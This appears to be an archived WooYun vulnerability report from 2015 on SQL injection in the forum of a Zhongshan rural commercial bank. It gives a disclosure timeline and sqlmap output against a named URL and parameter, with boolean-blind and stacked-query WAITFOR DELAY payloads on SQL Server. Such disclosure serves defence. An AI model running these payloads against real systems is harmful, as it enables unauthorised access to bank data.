wybug_title: 中山农商银行sql注射&小问题打包
wybug_corp: 中山农村商业银行股份有限公司
wybug_status: 已交由第三方合作机构(广东省信息安全测评中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-06-19：	细节已通知厂商并且等待厂商处理中									2015-06-23：	厂商已经确认，细节仅向厂商公开									2015-07-03：	细节向核心白帽子及相关领域专家公开									2015-07-13：	细节向普通白帽子公开									2015-07-23：	细节向实习白帽子公开									2015-08-07：	细节向公众公开  简要描述： 一点寒光万丈芒屠尽天下又何妨深埋不改凌锐志一聚风云便是皇 详细说明：  0x01:sql注射
Sql注射点到为止，所属银行所以没有深入

C:\>sqlmap.py -u http://bbs.zsebank.com/bbs/bbs_audit_moderator.jsp?fid=1993         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150531}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:27:26[13:27:27] [INFO] resuming back-end DBMS 'microsoft sql server'[13:27:28] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: fid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: fid=1993 AND 5948=5948    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: fid=1993;WAITFOR DELAY '0:0:5'-----[13:27:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2008[13:27:31] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\bbs.zsebank.com'[*] shutting down at 13:27:31
